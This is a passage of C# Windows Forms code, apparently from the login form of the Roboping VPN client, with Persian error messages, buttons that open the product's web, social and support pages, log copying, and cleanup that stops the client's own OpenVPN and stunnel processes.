                                    ERROR.instance.errortext.Text = "نام کاربری شما به درستی ساخته نشده است و شامل فاصله میباشد ویا از واژگان نامتعار استفاده شده";
                                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                                }));
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Handle exceptions on the UI thread
                    this.Invoke((Action)(() =>
                    {
                        label2.Visible = true;
                        label2.ForeColor = Color.Red;
                        label2.Text = "لطفا دوباره تلاش کنید";
                        guna2WinProgressIndicator1.Visible = false;

                       // MessageBox.Show($"An error occurred: {ex.Message}");

                        eror.showdialog();
                        ERROR.instance.errortext.Text = "چیزی نشده فقط یا وی پی انت روشنه و یا دی ان اس خارجی ست کردی برشون دار یا خاموششون کن اگر درست نشد پس مشکل از منه به پشتیبانی خبر بده تا درستم کنه";
                    }));

                    // Log or handle the exception
                    Console.WriteLine(ex.Message);
                    guna2WinProgressIndicator1.Visible = false;
                    // Cleanup
                    KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");
                }
            */
            }
        }



        private void label17_Click(object sender, EventArgs e)
        {
            string url = "https://roboping.ir/login.html";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = "صفحه پنل کاربری سایت روبوپینگ یافت نشد";

                Console.WriteLine("صفحه پنل کاربری سایت روبوپینگ یافت نشد");
            }
        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            string url = "https://roboping.ir";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = "صفحه سایت روبوپینگ یافت نشد";
                Console.WriteLine("صفحه سایت روبوپینگ یافت نشد");
            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            string url = "https://t.me/Roboping";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = "کانال دیسکورد روبوپینگ یافت نشد";
            }
        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {
            string url = "https://discord.gg/nJF6twdEkm";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = " چنل دیسکورد روبوپینگ یافت نشد";
            }
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            string url = "https://www.instagram.com/roboping";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = "صفحه اینستاگرام روبوپینگ یافت نشد";
            }
        }

        private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Login_FormClosed(object sender, FormClosedEventArgs e)
        {
            KillProcessesWithNames("openvpn", "RP", "Openvpnserv2", "OpenVPN Service", "OpenVPN Daemon", "RPO", "RPT", "stunnel");

            Environment.Exit(1);
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            string url = "https://www.goftino.com/c/UP3DN7";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = " صفحه پشتیبانی یافت نشد";
            }
        }

        private void guna2Button8_Click(object sender, EventArgs e)
        {
            string url = "https://www.aparat.com/Roboping";

            try
            {
                Process.Start(url);
            }
            catch (Exception)
            {
                eror.showdialog();
                ERROR.instance.errortext.Text = " صفحه پشتیبانی یافت نشد";
            }
        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {
            try
            {
                // Specify the file path (adjust this to your file location)
                string filePath = @"Log.txt";

                // Read the content of the file
                string fileContent = File.ReadAllText(filePath);

                // Copy the content to the clipboard
                Clipboard.SetText(fileContent);

                Invoke(new MethodInvoker(delegate
                {
                    eror.showdialog();
                    ERROR.instance.errortext.Text = "لاگ نرم افزار با موفقیت کپی شد";
                }));
            }
            catch (Exception ex)
            {
                // Show an error message in case something goes wrong
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


        private async void guna2Button10_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button10_Click_2(object sender, EventArgs e)
        {

        }
    }
}
